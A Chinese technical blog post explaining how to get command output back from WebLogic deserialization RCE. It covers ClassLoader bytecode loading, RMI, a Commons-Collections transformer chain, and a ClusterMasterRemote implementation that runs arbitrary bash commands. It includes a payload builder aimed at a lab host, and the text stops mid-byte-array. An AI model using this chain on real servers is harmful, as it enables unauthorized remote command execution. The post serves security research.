---
title: "Weblogic使用ClassLoader和RMI来回显命令执行结果"
date: 2020-02-14T20:17:12+08:00
draft: true
tags:
- Weblogic
- RMI
- ClassLoader
series:
- Weblogic
categories:
- 代码审计
---

解决Weblogic执行命令无回显的问题
<!--more-->
最近在研究weblogic，复现了几个CVE执行命令都没有回显，Google了一下，发现可以通过RMI来解决weblogic反序列化RCE没有命令执行结果回显，先看下基础知识。

## Java类
Java是编译型语言，所有的Java代码都需要被编译成字节码来让JVM执行。Java类初始化时会调用 `java.lang.ClassLoader` 加载类字节码，ClassLoader会调用defineClass方法来创建一个 `java.lang.Class` 类实例。

比如创建一个类
```java
package com.test.ClassLoader;

public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("hello");
    }
}
```
生成class字节后，利用Java自带的反编译工具看一下。
![image](https://y4er.com/img/uploads/20200216016230.png)

我们用java代码读取下class的字节码
```java
package com.test.ClassLoader;

import java.io.*;


public class ClassLoaderMain {
    public static void main(String[] args) {
        byte[] bs = getBytesByFile("E:\\work\\code\\java\\ClassLoaderTest\\out\\production\\ClassLoaderTest\\com\\test\\ClassLoader\\HelloWorld.class");
        for (int i = 0; i < bs.length; i++) {
            System.out.print(bs[i]+",");
        }
    }
    public static byte[] getBytesByFile(String pathStr) {
        File file = new File(pathStr);
        try {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream(1000);
            byte[] b = new byte[1000];
            int n;
            while ((n = fis.read(b)) != -1) {
                bos.write(b, 0, n);
            }
            fis.close();
            byte[] data = bos.toByteArray();
            bos.close();
            return data;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
```
ClassLoader实际上就是根据这个字节码定义的类实例。

## Java的类加载机制
Java中类加载可以分为显示和隐式，通过反射或者ClassLoader类加载就是显示加载，而`类名.方法名`或者new一个类实例就是隐式加载。

常见类加载的几种方法有
1. Class.forName() 实际上就是反射加载
```java
try {
    Class.forName("com.test.ClassLoader.HelloWorld");
    HelloWorld.test();
} catch (ClassNotFoundException e) {
    e.printStackTrace();
}
```
2. loadClass() 使用ClassLoader加载
```java
try {
    ClassLoaderMain.class.getClassLoader().loadClass("com.test.ClassLoader.HelloWorld");
    HelloWorld.test();
} catch (ClassNotFoundException e) {
    e.printStackTrace();
}
```
## ClassLoader类
一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。ClassLoader类有如下核心方法：
1. loadClass(加载指定的Java类)
2. findClass(查找指定的Java类)
3. findLoadedClass(查找JVM已经加载过的类)
4. defineClass(定义一个Java类)
5. resolveClass(链接指定的Java类)

我们可以通过自己编译写好的类，然后用字节码来自定义类。

## 使用字节码自定义类
如果classpath中不存在你想要的类，我们可以用字节码重写ClassLoader类的findClass方法，当找不到这个类时，调用defineClass方法的时候传入自己类的字节码的方式来向JVM中定义一个类。
```java
package com.test.ClassLoader;

public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello");
    }
    public static void test(){
        System.out.println("test");
    }
}
```
比如我想要上面这个类，可以在编译后通过hexdump或者java来读取字节码，我仍然使用最上面的java来读取类字节码。

![image](https://y4er.com/img/uploads/20200216011190.png)


然后重写ClassLoader的findClass方法，通过反射来调用自己的test()方法。
```java
package com.test.ClassLoader;

import java.lang.reflect.Method;

public class MyClassLoader extends ClassLoader {
    private static String myClassName = "com.test.ClassLoader.HelloWorld";
    private static byte[] bs = new byte[]{

        -54, -2, -70, -66, 0, 0, 0, 52, 0, 36, 10, 0, 7, 0, 22, 9, 0, 23, 0, 24, 8, 0, 25, 10, 0, 26, 0, 27, 8, 0, 19, 7, 0, 28, 7, 0, 29, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 33, 76, 99, 111, 109, 47, 116, 101, 115, 116, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 47, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 59, 1, 0, 4, 109, 97, 105, 110, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 4, 97, 114, 103, 115, 1, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 4, 116, 101, 115, 116, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 15, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 8, 0, 9, 7, 0, 30, 12, 0, 31, 0, 32, 1, 0, 5, 72, 101, 108, 108, 111, 7, 0, 33, 12, 0, 34, 0, 35, 1, 0, 31, 99, 111, 109, 47, 116, 101, 115, 116, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 47, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 0, 33, 0, 6, 0, 7, 0, 0, 0, 0, 0, 3, 0, 1, 0, 8, 0, 9, 0, 1, 0, 10, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 11, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 12, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 13, 0, 14, 0, 0, 0, 9, 0, 15, 0, 16, 0, 1, 0, 10, 0, 0, 0, 55, 0, 2, 0, 1, 0, 0, 0, 9, -78, 0, 2, 18, 3, -74, 0, 4, -79, 0, 0, 0, 2, 0, 11, 0, 0, 0, 10, 0, 2, 0, 0, 0, 5, 0, 8, 0, 6, 0, 12, 0, 0, 0, 12, 0, 1, 0, 0, 0, 9, 0, 17, 0, 18, 0, 0, 0, 9, 0, 19, 0, 9, 0, 1, 0, 10, 0, 0, 0, 37, 0, 2, 0, 0, 0, 0, 0, 9, -78, 0, 2, 18, 5, -74, 0, 4, -79, 0, 0, 0, 1, 0, 11, 0, 0, 0, 10, 0, 2, 0, 0, 0, 8, 0, 8, 0, 9, 0, 1, 0, 20, 0, 0, 0, 2, 0, 21,
    };

    public static void main(String[] args) {
        try {
            MyClassLoader loader = new MyClassLoader();
            Class helloClass = loader.loadClass(myClassName);
            Object obj = helloClass.newInstance();
            Method method = obj.getClass().getMethod("test");
            method.invoke(null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name == myClassName) {
            System.out.println("加载" + name + "类");
            return defineClass(myClassName, bs, 0, bs.length);
        }
        return super.findClass(name);
    }

}
```
删掉classpath中的HelloWorld.class字节码，然后运行。

![image](https://y4er.com/img/uploads/20200216019433.png)

成功调用字节码定义的test()方法。

## RMI简介
RMI(Remote Method Invocation)即Java远程方法调用，RMI用于构建分布式应用程序，RMI实现了Java程序之间跨JVM的远程通信。一个RMI过程有以下三个参与者：
1. RMI Registry
2. RMI Server
3. RMI Client

来看一个例子
RMIServer.java
```java
package com.test.rmi;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {

    public interface IRemoteHelloWorld extends Remote {
        public String hello() throws RemoteException;
    }

    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld {

        protected RemoteHelloWorld() throws RemoteException {
            super();
        }

        @Override
        public String hello() throws RemoteException {
            System.out.println("call hello()");
            return "helloworld";
        }
    }

    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }

}
```
RMIClient.java
```java
package com.test.Train;

import com.test.rmi.RMIServer;

import java.rmi.Naming;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)
            Naming.lookup("rmi://127.0.0.1:1099/Hello");
        String res = hello.hello();
        System.out.println(res);
    }
}
```
在RMIServer代码中的Server其实包含了Registry和Server两部分，分别运行Server和Client看下。

![image](https://y4er.com/img/uploads/20200216017254.png)

![image](https://y4er.com/img/uploads/20200216019096.png)

由此可见Client远程调用了Server的hello()方法，输出了helloworld。我们回过头来看下Server的结构
1. 定义一个IRemoteHelloWorld接口继承Remote
2. 在接口中定义一个hello()方法 **方法必须抛出 java.rmi.RemoteException 异常**
3. 定义一个RemoteHelloWorld类实现IRemoteHelloWorld接口并继承UnicastRemoteObject类
4. 重写hello()方法
5. 新建RemoteHelloWorld对象绑定在`rmi://127.0.0.1:1099/Hello`开始监听

本文不深入探讨RMI的工作原理，我们只需要知道如果Server端有继承Remote的接口，并且实现了具体方法时，我们可以在Client去调用他的方法。

## RMI和Weblogic的结合
到目前为止，我们知道可以通过ClassLoader类和字节码来定义我们自己的类，也知道可以通过RMI来调用远程服务器的方法。那么在weblogic之中，RMI有什么妙用？

之前写的几篇关于Weblogic的反序列化RCE因为没有回显结果，都是通过curl或者dnslog来验证的，而看了上文之后，我们可以通过common-collection反序列化调用ClassLoader，通过字节码来自定义一个RMI接口类，在类实现的方法中返回命令执行的结果。

那么现在有几个问题：
1. defineClass需要ClassLoader的子类才能拿到
2. 具体应该实现哪个RMI接口类呢？
3. common-collection构造的问题

因为ClassLoader是一个abstract，所以我们只能从他的子类中寻找defineClass()，idea快捷键CTRL ALT B 或者 CTRL+H 可以寻找子类，我找到了以下几个
```
jxxload_help.PathVFSJavaLoader#loadClassFromBytes
org.python.core.BytecodeLoader1#loadClassFromBytes
sun.org.mozilla.javascript.internal.DefiningClassLoader#defineClass
java.security.SecureClassLoader#defineClass(java.lang.String, byte[], int, int, java.security.CodeSource)
org.mozilla.classfile.DefiningClassLoader#defineClass
```
这几个的defineClass()没有做检查，可以直接定义类。weblogic_cmd用的是最后一个。

然后我们再来看应该实现哪个RMI接口，可以直接在Remote类按快捷键寻找，378个......
![image](https://y4er.com/img/uploads/20200216011485.png)

注意我们要找的是interface，并且我们要返回命令执行的结果，所以方法的返回类型应该为String，并且方法必须抛出 java.rmi.RemoteException 异常。

![image](https://y4er.com/img/uploads/20200216010614.png)

随便找了几个
```
weblogic.ejb.QueryHome
weblogic.ejb20.interfaces.RemoteHome#getIsIdenticalKey
weblogic.jndi.internal.NamingNode#getNameInNamespace(java.lang.String)
weblogic.cluster.singleton.ClusterMasterRemote
```
weblogic_cmd用的就是最后一个，我们也用最后一个来构造
```java
package com.test.payload;

import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;

public class RemoteImpl implements ClusterMasterRemote {

    public static void main(String[] args) {
        RemoteImpl remote = new RemoteImpl();
        try {
            Context context = new InitialContext();
            context.rebind("Y4er",remote);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void setServerLocation(String cmd, String args) throws RemoteException {

    }


    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            List<String> cmds = new ArrayList<String>();

            cmds.add("/bin/bash");
            cmds.add("-c");
            cmds.add(cmd);

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
```
最后一个问题就是common-collection的transform[]构造的问题，我们要通过反射的形式调用DefiningClassLoader的defineClass()去定义我们自己的类，然后还是反射调用自己类的main方法。也就是如下。
```java
// common-collection1 构造transformers 定义自己的RMI接口
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(DefiningClassLoader.class),
    new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
    new InvokerTransformer("defineClass",
                           new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
    new ConstantTransformer(new HashSet())};
```

接下来将我们自己写好的RMI接口类生成字节码之后构造payload
```java
package com.test;

import com.supeream.serial.Reflections;
import com.supeream.serial.SerialDataGenerator;
import com.supeream.serial.Serializables;
import com.supeream.ssl.WeblogicTrustManager;
import com.supeream.weblogic.T3ProtocolOperation;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.classfile.DefiningClassLoader;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.corba.utils.MarshalledObject;
import weblogic.jndi.Environment;

import javax.naming.Context;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Main {
    private static String host = "172.16.2.129";
    private static String port = "7001";
    private static final String classname = "com.test.payload.RemoteImpl";
    private static final byte[] bs = new byte[]{
        -54, -2, -70, -66, 0, 0, 0, 50, 0, -116, 10, 0, 32, 0, 83, 7, 0, 84, 10, 0, 2, 0, 83, 7, 0, 85, 10, 0, 4, 0, 83, 8, 0, 86, 11, 0, 87, 0, 88, 10, 0, 2, 0, 89, 7, 0, 90, 10, 0, 9, 0, 91, 7, 0, 92, 10, 0, 11, 0, 83, 8, 0, 93, 11, 0, 94, 0, 95, 8, 0, 96, 7, 0, 97, 10, 0, 16, 0, 98, 10, 0, 16, 0, 99, 10, 0, 16, 0, 100, 7, 0, 101, 7, 0, 102, 10, 0, 103, 0, 104, 10, 0, 21, 0, 105, 10, 0, 20, 0, 106, 7, 0, 107, 10, 0, 25, 0, 83, 10, 0, 20, 0, 108, 10, 0, 25, 0, 109, 8, 0, 110, 10, 0, 25, 0, 111, 10, 0, 9, 0, 112, 7, 0, 113, 7, 0, 114, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 29, 76, 99, 111, 109, 47, 116, 101, 115, 116, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 59, 1, 0, 4, 109, 97, 105, 110, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 7, 99, 111, 110, 116, 101, 120, 116, 1, 0, 22, 76, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 67, 111, 110, 116, 101, 120, 116, 59, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 4, 97, 114, 103, 115, 1, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 114, 101, 109, 111, 116, 101, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 48, 7, 0, 84, 7, 0, 90, 1, 0, 17, 115, 101, 116, 83, 101, 114, 118, 101, 114, 76, 111, 99, 97, 116, 105, 111, 110, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 3, 99, 109, 100, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 115, 1, 0, 17, 103, 101, 116, 83, 101, 114, 118, 101, 114, 76, 111, 99, 97, 116, 105, 111, 110, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 4, 99, 109, 100, 115, 1, 0, 16, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 59, 1, 0, 14, 112, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 1, 0, 26, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 4, 112, 114, 111, 99, 1, 0, 19, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 2, 98, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 2, 115, 98, 1, 0, 24, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 4, 108, 105, 110, 101, 1, 0, 22, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 121, 112, 101, 84, 97, 98, 108, 101, 1, 0, 36, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 60, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 62, 59, 7, 0, 116, 7, 0, 117, 7, 0, 97, 7, 0, 118, 7, 0, 101, 7, 0, 107, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 36, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 46, 106, 97, 118, 97, 32, 102, 114, 111, 109, 32, 73, 110, 112, 117, 116, 70, 105, 108, 101, 79, 98, 106, 101, 99, 116, 12, 0, 34, 0, 35, 1, 0, 27, 99, 111, 109, 47, 116, 101, 115, 116, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 1, 0, 27, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 73, 110, 105, 116, 105, 97, 108, 67, 111, 110, 116, 101, 120, 116, 1, 0, 4, 89, 52, 101, 114, 7, 0, 119, 12, 0, 120, 0, 121, 12, 0, 60, 0, 61, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 122, 0, 35, 1, 0, 19, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 65, 114, 114, 97, 121, 76, 105, 115, 116, 1, 0, 9, 47, 98, 105, 110, 47, 98, 97, 115, 104, 7, 0, 117, 12, 0, 123, 0, 124, 1, 0, 2, 45, 99, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 12, 0, 34, 0, 125, 12, 0, 126, 0, 127, 12, 0, -128, 0, -127, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 7, 0, 118, 12, 0, -126, 0, -125, 12, 0, 34, 0, -124, 12, 0, 34, 0, -123, 1, 0, 22, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 12, 0, -122, 0, -121, 12, 0, -120, 0, -119, 1, 0, 1, 10, 12, 0, -118, 0, -121, 12, 0, -117, 0, -121, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 46, 119, 101, 98, 108, 111, 103, 105, 99, 47, 99, 108, 117, 115, 116, 101, 114, 47, 115, 105, 110, 103, 108, 101, 116, 111, 110, 47, 67, 108, 117, 115, 116, 101, 114, 77, 97, 115, 116, 101, 114, 82, 101, 109, 111, 116, 101, 1, 0, 24, 106, 97, 118, 97, 47, 114, 109, 105, 47, 82, 101, 109, 111, 116, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 14, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 1, 0, 20, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 67, 111, 110, 116, 101, 120, 116, 1, 0, 6, 114, 101, 98, 105, 110, 100, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 1, 0, 3, 97, 100, 100, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 90, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 59, 41, 86, 1, 0, 19, 114, 101, 100, 105, 114, 101, 99, 116, 69, 114, 114, 111, 114, 83, 116, 114, 101, 97, 109, 1, 0, 29, 40, 90, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 5, 115, 116, 97, 114, 116, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 86, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 44, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 1, 0, 10, 103, 101, 116, 77, 101, 115, 115, 97, 103, 101, 0, 33, 0, 2, 0, 32, 0, 1, 0, 33, 0, 0, 0, 4, 0, 1, 0, 34, 0, 35, 0, 1, 0, 36, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 37, 0, 0, 0, 6, 0, 1, 0, 0, 0, 14, 0, 38, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 39, 0, 40, 0, 0, 0, 9, 0, 41, 0, 42, 0, 1, 0, 36, 0, 0, 0, -81, 0, 3, 0, 3, 0, 0, 0, 42, -69, 0, 2, 89, -73, 0, 3, 76, -69, 0, 4, 89, -73, 0, 5, 77, 44, 18, 6, 43, -71, 0, 7, 3, 0, 43, 42, 3, 50, -74, 0, 8, 87, -89, 0, 8, 77, 44, -74, 0, 10, -79, 0, 1, 0, 8, 0, 33, 0, 36, 0, 9, 0, 3, 0, 37, 0, 0, 0, 34, 0, 8, 0, 0, 0, 17, 0, 8, 0, 19, 0, 16, 0, 20, 0, 25, 0, 21, 0, 33, 0, 24, 0, 36, 0, 22, 0, 37, 0, 23, 0, 41, 0, 25, 0, 38, 0, 0, 0, 42, 0, 4, 0, 16, 0, 17, 0, 43, 0, 44, 0, 2, 0, 37, 0, 4, 0, 45, 0, 46, 0, 2, 0, 0, 0, 42, 0, 47, 0, 48, 0, 0, 0, 8, 0, 34, 0, 49, 0, 40, 0, 1, 0, 50, 0, 0, 0, 19, 0, 2, -1, 0, 36, 0, 2, 7, 0, 51, 7, 0, 52, 0, 1, 7, 0, 53, 4, 0, 1, 0, 54, 0, 55, 0, 2, 0, 36, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 37, 0, 0, 0, 6, 0, 1, 0, 0, 0, 31, 0, 38, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 39, 0, 40, 0, 0, 0, 0, 0, 1, 0, 56, 0, 57, 0, 1, 0, 0, 0, 1, 0, 47, 0, 57, 0, 2, 0, 58, 0, 0, 0, 4, 0, 1, 0, 59, 0, 1, 0, 60, 0, 61, 0, 2, 0, 36, 0, 0, 1, 126, 0, 5, 0, 8, 0, 0, 0, 124, -69, 0, 11, 89, -73, 0, 12, 77, 44, 18, 13, -71, 0, 14, 2, 0, 87, 44, 18, 15, -71, 0, 14, 2, 0, 87, 44, 43, -71, 0, 14, 2, 0, 87, -69, 0, 16, 89, 44, -73, 0, 17, 78, 45, 4, -74, 0, 18, 87, 45, -74, 0, 19, 58, 4, -69, 0, 20, 89, -69, 0, 21, 89, 25, 4, -74, 0, 22, -73, 0, 23, -73, 0, 24, 58, 5, -69, 0, 25, 89, -73, 0, 26, 58, 6, 25, 5, -74, 0, 27, 89, 58, 7, -58, 0, 19, 25, 6, 25, 7, -74, 0, 28, 18, 29, -74, 0, 28, 87, -89, -1, -24, 25, 6, -74, 0, 30, -80, 77, 44, -74, 0, 31, -80, 0, 1, 0, 0, 0, 117, 0, 118, 0, 9, 0, 4, 0, 37, 0, 0, 0, 58, 0, 14, 0, 0, 0, 38, 0, 8, 0, 40, 0, 17, 0, 41, 0, 26, 0, 42, 0, 34, 0, 44, 0, 43, 0, 45, 0, 49, 0, 46, 0, 55, 0, 48, 0, 76, 0, 49, 0, 85, 0, 52, 0, 96, 0, 53, 0, 112, 0, 56, 0, 118, 0, 57, 0, 119, 0, 58, 0, 38, 0, 0, 0, 92, 0, 9, 0, 8, 0, 110, 0, 62, 0, 63, 0, 2, 0, 43, 0, 75, 0, 64, 0, 65, 0, 3, 0, 55, 0, 63, 0, 66, 0, 67, 0, 4, 0, 76, 0, 42, 0, 68, 0, 69, 0, 5, 0, 85, 0, 33, 0, 70, 0, 71, 0, 6, 0, 93, 0, 25, 0, 72, 0, 57, 0, 7, 0, 119, 0, 5, 0, 45, 0, 46, 0, 2, 0, 0, 0, 124, 0, 39, 0, 40, 0, 0, 0, 0, 0, 124, 0, 56, 0, 57, 0, 1, 0, 73, 0, 0, 0, 12, 0, 1, 0, 8, 0, 110, 0, 62, 0, 74, 0, 2, 0, 50, 0, 0, 0, 52, 0, 3, -1, 0, 85, 0, 7, 7, 0, 52, 7, 0, 75, 7, 0, 76, 7, 0, 77, 7, 0, 78, 7, 0, 79, 7, 0, 80, 0, 0, -4, 0, 26, 7, 0, 75, -1, 0, 5, 0, 2, 7, 0, 52, 7, 0, 75, 0, 1, 7, 0, 